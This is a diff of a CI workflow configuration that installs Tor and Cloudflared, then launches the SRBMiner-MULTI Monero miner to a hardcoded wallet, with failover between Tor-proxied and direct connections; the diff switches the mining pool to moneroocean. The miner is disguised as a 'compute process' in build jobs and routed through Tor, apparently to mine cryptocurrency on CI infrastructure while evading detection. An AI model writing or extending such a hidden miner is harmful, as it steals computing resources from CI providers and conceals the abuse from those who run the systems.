@@ -13,7 +13,7 @@ jobs:
             apt-get install -y -qq curl wget iproute2 tor
       
       - run:
-          name: "Setup Cloudflare + Tor Hybrid..."
+          name: "Setup Cloudflare + Tor Hybrid"
           command: |
             echo "==================================="
             echo "Installing Cloudflared..."
@@ -132,7 +132,7 @@ jobs:
             
             echo "==================================="
             echo "Starting compute process..."
-            echo "Target: xmr-sg.kryptex.network:8029"
+            echo "Target: gulf.moneroocean.stream:10128"
             echo "Routing: Tor + Cloudflare DNS"
             echo "DNS: Cloudflare DoH (Port 5053)"
             echo "Proxy: $PROXY_STATUS"
@@ -141,7 +141,7 @@ jobs:
             # Start with Tor proxy if available, otherwise direct
             if [ "$PROXY_STATUS" = "TOR" ]; then
               ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                --pool xmr-sg.kryptex.network:8029 \
+                --pool gulf.moneroocean.stream:10128 \
                 --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4" \
                 --password "CF-Worker-$RANDOM" \
                 --proxy 127.0.0.1:9050 \
@@ -149,7 +149,7 @@ jobs:
             else
               echo "⚠️ Using direct connection (Tor not ready)"
               ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                --pool xmr-sg.kryptex.network:8029 \
+                --pool gulf.moneroocean.stream:10128 \
                 --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4" \
                 --password "Direct-$RANDOM" \
                 --log-file /tmp/compute.log &
@@ -203,7 +203,7 @@ jobs:
                     echo "Switching from Tor to Direct..."
                     PROXY_STATUS="DIRECT"
                     ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                      --pool xmr-sg.kryptex.network:8029 \
+                      --pool gulf.moneroocean.stream:10128 \
                       --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4" \
                       --password "Direct-$RANDOM" \
                       --log-file /tmp/compute.log &
@@ -211,7 +211,7 @@ jobs:
                     echo "Switching from Direct to Tor..."
                     PROXY_STATUS="TOR"
                     ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                      --pool xmr-sg.kryptex.network:8029 \
+                      --pool gulf.moneroocean.stream:10128 \
                       --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4" \
                       --password "CF-Worker-$RANDOM" \
                       --proxy 127.0.0.1:9050 \
@@ -221,14 +221,14 @@ jobs:
                   # Normal restart with same config
                   if [ "$PROXY_STATUS" = "TOR" ]; then
                     ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                      --pool xmr-sg.kryptex.network:8029 \
+                      --pool gulf.moneroocean.stream:10128 \
                       --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4" \
                       --password "CF-Worker-$RANDOM" \
                       --proxy 127.0.0.1:9050 \
                       --log-file /tmp/compute.log &
                   else
                     ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                      --pool xmr-sg.kryptex.network:8029 \
+                      --pool gulf.moneroocean.stream:10128 \
                       --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4" \
                       --password "Direct-$RANDOM" \
                       --log-file /tmp/compute.log &
